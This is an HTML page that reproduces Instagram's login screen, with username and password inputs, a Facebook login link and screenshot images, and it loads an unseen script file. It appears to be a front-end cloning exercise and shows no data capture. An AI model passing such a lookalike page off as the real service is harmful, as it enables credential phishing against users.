<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Log In</title>
    <link rel="stylesheet" href="./styles/style.css">
<body>
    <img class="insta_img" src="./images/Снимок экрана 2025-01-04 212558.png" alt="insta">
    <div class="right">
        <div class="form">
            <img src="./images/Снимок экрана 2025-01-04 213539.png" alt="font" class="insta_font">
            <input placeholder="Phone number, username, or email" class="username" type="text">
            <input placeholder="Password" class="password" type="password">
            <button class="login">Log in</button>
            
            <p class="ar"></p>
            <p class="or"></p>
            <img src="./images/images.jpg" alt="face" class="facebook">
            <a class="facebook_p">Log in with Facebook</a>
            <p class="forgot">Forgot password?</p>
    
            
        </div>
    
        <div class="sign">
            <p class="sign_up">Don't have an account? <strong>Sign up</strong></p>
        </div>
        <p class="get">Get the app.</p>
        <img src="./images/Снимок экрана 2025-01-04 215834.png" alt="app" class="app">
    </div>
    
</body>
<script src="./scripts/app.js"></script>
</html>
